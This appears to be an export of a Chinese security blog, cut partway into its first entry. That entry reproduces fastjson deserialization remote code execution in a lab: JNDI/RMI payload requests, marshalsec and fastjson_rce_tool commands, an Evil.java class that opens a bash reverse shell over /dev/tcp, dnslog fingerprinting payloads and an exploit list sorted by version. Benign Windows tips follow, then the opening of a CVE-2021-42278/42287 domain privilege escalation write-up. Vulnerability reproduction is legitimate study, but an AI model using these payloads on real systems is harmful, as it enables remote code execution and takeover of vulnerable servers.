+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.56.1:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 157</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.56.1:9999/Evil&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+ <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144529.png" alt="image-20210901152322290" style="zoom:80%;" />
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144092.png" alt="image-20210901152340189"></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.56.1:8989/#Evil&quot; 9999</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m http.server --bind 192.168.56.1 8989</span><br></pre></td></tr></table></figure>
+
+ <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144433.png" alt="image-20210901143418464" style="zoom:80%;" />
+
+
+
+<h3 id="fastjson-rce-tool"><a href="#fastjson-rce-tool" class="headerlink" title="fastjson_rce_tool"></a><a href="https://github.com/wyzxxz/fastjson_rce_tool">fastjson_rce_tool</a></h3><p>使用  <code>fastjson_rce_tool</code> 快速getshell</p>
+<p><a href="https://github.com/wyzxxz/fastjson_rce_tool">https://github.com/wyzxxz/fastjson_rce_tool</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp fastjson_tool.jar fastjson.HRMIServer 192.168.56.1 8888  &quot;bash=bash -i &gt;&amp;/dev/tcp/192.168.56.1/9090 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+ <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312145473.png" alt="image-20210901151615763" style="zoom:80%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.56.1:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 129</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;: &quot;rmi://192.168.56.1:8888/Object&quot;,</span><br><span class="line">        &quot;autoCommit&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+ <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144374.png" alt="image-20210901152003880" style="zoom:80%;" />
+
+
+
+
+
+<h2 id="fastjson-1-2-47-rce"><a href="#fastjson-1-2-47-rce" class="headerlink" title="fastjson/1.2.47-rce"></a>fastjson/1.2.47-rce</h2><p>目标环境是<code>openjdk:8u102</code>，这个版本没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以简单利用RMI进行命令执行。</p>
+<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>使用 <code>vulhub</code> 搭建 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312145045.png" alt="image-20210901185209143"></p>
+<h3 id="GetShell-1"><a href="#GetShell-1" class="headerlink" title="GetShell"></a>GetShell</h3><p>使用 <code>nc</code> 监听得到反弹shell</p>
+<blockquote>
+<h4 id="Evil-java-1"><a href="#Evil-java-1" class="headerlink" title="Evil.java"></a>Evil.java</h4></blockquote>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javac Evil.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.56.1/9090 0&gt;&amp;1 &amp;&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;/bin/bash&quot;</span>, <span class="attr">&quot;-c&quot;</span>, <span class="attr">&quot;bash -i &gt;&amp; /dev/tcp/192.168.56.1/9090 0&gt;&amp;1 &amp;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.56.1:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 157</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.56.1:9999/Evil&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+ <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312145880.png" alt="image-20210901152322290" style="zoom:80%;" />
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312156180.png" alt="image-20210901152340189"></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.56.1:8989/#Evil&quot; 9999</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m http.server --bind 192.168.56.1 8989</span><br></pre></td></tr></table></figure>
+
+ <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312145814.png" alt="image-20210901143418464" style="zoom:80%;" />
+
+
+
+<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h3 id="未知目标是否使用-Fastjson-，但站点有原始报错回显"><a href="#未知目标是否使用-Fastjson-，但站点有原始报错回显" class="headerlink" title="未知目标是否使用 Fastjson ，但站点有原始报错回显"></a><strong>未知目标是否使用 Fastjson ，但站点有原始报错回显</strong></h3><p>如果站点有原始报错回显，可以用不闭合花括号的方式进行报错回显，报错中往往会有fastjson的字样</p>
+<p>例如</p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312145526.png" alt="image-20200704162617071"></p>
+<h3 id="无回显，通过DNS回显的方式盲区分-Fastjson-和-Jackson"><a href="#无回显，通过DNS回显的方式盲区分-Fastjson-和-Jackson" class="headerlink" title="无回显，通过DNS回显的方式盲区分 Fastjson 和 Jackson"></a><strong>无回显，通过DNS回显的方式盲区分 Fastjson 和 Jackson</strong></h3><p>我使用以下payload测试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;745shj.dnslog.cn&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312145278.png" alt="image-20200704162844047"></p>
+<p>最终收到dnslog</p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312146617.png" alt="image-20200704162922529"></p>
+<h3 id="最新版本1-2-67依然可以通过dnslog判断后端是否使用fastjson"><a href="#最新版本1-2-67依然可以通过dnslog判断后端是否使用fastjson" class="headerlink" title="最新版本1.2.67依然可以通过dnslog判断后端是否使用fastjson"></a>最新版本1.2.67依然可以通过dnslog判断后端是否使用fastjson</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>畸形的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312146104.png" alt="img"></p>
+<p>POC:</p>
+<p>要嵌套在里面zeo里面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br></pre></td></tr></table></figure>
+
+<h2 id="多版本payload集合"><a href="#多版本payload集合" class="headerlink" title="多版本payload集合"></a>多版本payload集合</h2><p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-24"><a href="#fastjson-lt-1-2-24" class="headerlink" title="fastjson&lt;=1.2.24"></a>fastjson&lt;=1.2.24</h3><p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://x.x.x.x:1099/jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-41"><a href="#fastjson-lt-1-2-41" class="headerlink" title="fastjson&lt;=1.2.41"></a>fastjson&lt;=1.2.41</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi://x.x.x.x:1098/jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-42"><a href="#fastjson-lt-1-2-42" class="headerlink" title="fastjson&lt;=1.2.42"></a>fastjson&lt;=1.2.42</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1399/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-43"><a href="#fastjson-lt-1-2-43" class="headerlink" title="fastjson&lt;=1.2.43"></a>fastjson&lt;=1.2.43</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1399/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-45"><a href="#fastjson-lt-1-2-45" class="headerlink" title="fastjson&lt;=1.2.45"></a>fastjson&lt;=1.2.45</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;ldap://localhost:1399/Exploit&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-47"><a href="#fastjson-lt-1-2-47" class="headerlink" title="fastjson&lt;=1.2.47"></a>fastjson&lt;=1.2.47</h3><p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.Class&quot;, </span><br><span class="line">        &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;, </span><br><span class="line">    &quot;b&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, </span><br><span class="line">        &quot;dataSourceName&quot;: &quot;ldap://x.x.x.x:1999/Exploit&quot;, </span><br><span class="line">        &quot;autoCommit&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-62"><a href="#fastjson-lt-1-2-62" class="headerlink" title="fastjson&lt;=1.2.62"></a>fastjson&lt;=1.2.62</h3><p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;rmi://127.0.0.1:1098/exploit&quot;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-66"><a href="#fastjson-lt-1-2-66" class="headerlink" title="fastjson&lt;=1.2.66"></a>fastjson&lt;=1.2.66</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransacti</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows10更改用户名方式</title>
+    <url>/articles/c63c4f59/</url>
+    <content><![CDATA[<h2 id="更改方式"><a href="#更改方式" class="headerlink" title="更改方式"></a>更改方式</h2><hr>
+<p>使用管理员权限打开一个CMD</p>
+<h3 id="修改用户名"><a href="#修改用户名" class="headerlink" title="修改用户名"></a>修改用户名</h3><p>输入 <code>control userpasswords2</code> ，回车；</p>
+<p>点击属性，修改用户名，点击确定；</p>
+<h3 id="注册表修改路径位置"><a href="#注册表修改路径位置" class="headerlink" title="注册表修改路径位置"></a>注册表修改路径位置</h3><p>打开运行，输入regedit，回车；<br>定位到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList；</span><br></pre></td></tr></table></figure>
+<p>选中下面名字最长的项，双击右侧的ProfileImagePath，修改 C:\Users\ 后的用户名，点击确定；</p>
+<p>注销并重新登录；</p>
+<h3 id="重命名用户文件夹"><a href="#重命名用户文件夹" class="headerlink" title="重命名用户文件夹"></a>重命名用户文件夹</h3><p>打开 C:\User\，</p>
+<p>将新的用户名文件夹删除，</p>
+<p>再将原来的的用户名文件夹重命名为新的用户名；</p>
+<p>再次注销并重新登录。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/u011479200/article/details/107902826">https://blog.csdn.net/u011479200/article/details/107902826</a></p>
+]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+      <tags>
+        <tag>Windows</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows下快速切换全拼/双拼</title>
+    <url>/articles/d4db3d41/</url>
+    <content><![CDATA[<h1 id="Windows下快速切换全拼-双拼"><a href="#Windows下快速切换全拼-双拼" class="headerlink" title="Windows下快速切换全拼/双拼"></a>Windows下快速切换全拼/双拼</h1><h2 id="bat批处理文件方式"><a href="#bat批处理文件方式" class="headerlink" title="bat批处理文件方式"></a>bat批处理文件方式</h2><h3 id="change-bat"><a href="#change-bat" class="headerlink" title="change.bat"></a>change.bat</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Mainkey=HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS </span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;reg query <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; ^| <span class="built_in">findstr</span> /i &quot;<span class="number">0</span>x1&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> flg=<span class="variable">%%i</span>) </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> flg ( reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x1 /f ) <span class="keyword">else</span> ( reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x0 /f )</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="ChangeAll-bat"><a href="#ChangeAll-bat" class="headerlink" title="ChangeAll.bat"></a>ChangeAll.bat</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Mainkey=HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;reg query <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; ^| <span class="built_in">findstr</span> /i &quot;<span class="number">0</span>x1&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> flg=<span class="variable">%%i</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> flg (</span><br><span class="line"><span class="comment">    @REM reg add %MainKey% /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d 0x1 /f</span></span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">    reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x0 /f</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="ChangeDouble-bat"><a href="#ChangeDouble-bat" class="headerlink" title="ChangeDouble.bat"></a>ChangeDouble.bat</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Mainkey=HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;reg query <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; ^| <span class="built_in">findstr</span> /i &quot;<span class="number">0</span>x1&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> flg=<span class="variable">%%i</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> flg (</span><br><span class="line">    reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x1 /f</span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line"><span class="comment">    @REM reg add %MainKey% /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d 0x0 /f</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="VBS脚本方式"><a href="#VBS脚本方式" class="headerlink" title="VBS脚本方式"></a>VBS脚本方式</h2><h3 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h3><figure class="highlight vbs"><table><tr><td class="code"><pre><span class="line"><span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>).Run <span class="string">&quot;ChangeAll.bat&quot;</span>,<span class="number">0</span></span><br><span class="line"><span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>).Run <span class="string">&quot;ChangeDouble.bat&quot;</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="uTools插件"><a href="#uTools插件" class="headerlink" title="uTools插件"></a>uTools插件</h2><p>目前已经做成了 uTools 插件 , 插件名称 : <code>切换微软全拼</code></p>
+<p>项目地址: <a href="https://github.com/syyu6/utools-ChangeDouble">https://github.com/syyu6/utools-ChangeDouble</a></p>
+<p>And so on …</p>
+<h2 id="utools快捷命令"><a href="#utools快捷命令" class="headerlink" title="utools快捷命令"></a>utools快捷命令</h2><h3 id="实现-ps1-脚本"><a href="#实现-ps1-脚本" class="headerlink" title="实现 ps1 脚本"></a>实现 ps1 脚本</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$out</span> = reg query HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS /v <span class="string">&quot;Enable Double Pinyin&quot;</span>; </span><br><span class="line"><span class="variable">$outStr</span> = <span class="variable">$out</span> <span class="operator">-as</span> [<span class="built_in">string</span>]; </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$outStr</span> <span class="operator">-match</span> <span class="string">&#x27;(Pinyin.+0x)(\d)&#x27;</span>) &#123;<span class="variable">$mode</span> = <span class="variable">$Matches</span>[<span class="number">2</span>] &#125; <span class="keyword">else</span> &#123; <span class="variable">$mode</span> = <span class="number">1</span> &#125;; </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$mode</span> <span class="operator">-as</span> [<span class="built_in">int</span>] <span class="operator">-eq</span> <span class="number">1</span>) &#123; <span class="variable">$Double</span> = <span class="number">0</span> &#125; <span class="keyword">else</span> &#123; <span class="variable">$Double</span> = <span class="number">1</span> &#125;;</span><br><span class="line">reg.exe add HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS /v <span class="string">&quot;Enable Double Pinyin&quot;</span> /t REG_DWORD /d <span class="variable">$Double</span> /f;</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+      <tags>
+        <tag>技巧</tag>
+        <tag>杂谈</tag>
+        <tag>Windows</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2021-42278 &amp; CVE-2021-42287 域提权</title>
+    <url>/articles/8e808fd4/</url>
+    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="CVE-2021-42278"><a href="#CVE-2021-42278" class="headerlink" title="CVE-2021-42278"></a><code>CVE-2021-42278</code></h3><p> 一般来说，机器账号的名字应该以<code>$</code>符号结尾的。例如<code>DC$</code>表示<code>DC</code>这台主机的账户名。但是微软只是进行了规定，并没有验证程序对用户创建的用户名进行验证，也就是说，创建<code>DC</code>用户名完全是可以的。（这里指的是机器账号的<code>sAMAccountName</code>属性）</p>
+<h3 id="CVE-2021-42287"><a href="#CVE-2021-42287" class="headerlink" title="CVE-2021-42287"></a><code>CVE-2021-42287</code></h3><p> 结合上面那个漏洞，如果创建了一个用户名为<code>DC</code>的账户，此时使用这个账户去申请一张<code>TGT</code>票据，然后在申请<code>ST</code>之前，将这个账户名修改掉或者删除掉，那么在进行申请<code>ST</code>的时候，<code>KDC</code>在进行验证时就查不到这个账户，此时<code>KDC</code>就会去查找<code>DC$</code>这个账户，如果这个账户存在的话，最终返回的就是<code>DC$</code>这个账户申请的<code>ST</code>。也就相当于获取到了域控账户申请的高权限服务票据。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞利用步骤"><a href="#漏洞利用步骤" class="headerlink" title="漏洞利用步骤"></a>漏洞利用步骤</h3><p>首先需要一个域内用户，然后提权至域管，接管域控。步骤如下</p>
+<ol>
+<li> 创建一个机器账户</li>
+<li> 清除机器账户的<code>SPN</code></li>
+<li> 修改机器账户的<code>sAMAccountName</code>属性值</li>
+<li> 使用机器账户请求<code>TGT</code></li>
+<li> 再次修改机器账户的<code>sAMAccountName</code>属性值</li>
+<li> 获取高权限<code>ST</code>票据</li>
+</ol>
+<ul>
+<li><h3 id="1-创建机器用户"><a href="#1-创建机器用户" class="headerlink" title="1.创建机器用户"></a>1.创建机器用户</h3></li>
+</ul>
+<blockquote>
+<p>  使用 <a href="https://github.com/Kevin-Robertson/Powermad">Powermad</a>  创建一个新的机器账户， <code>syyu$</code></p>
+<p>  当申请一个机器账户<code>MachineCount</code>时，<code>SPN</code>会自动注册</p>
+</blockquote>
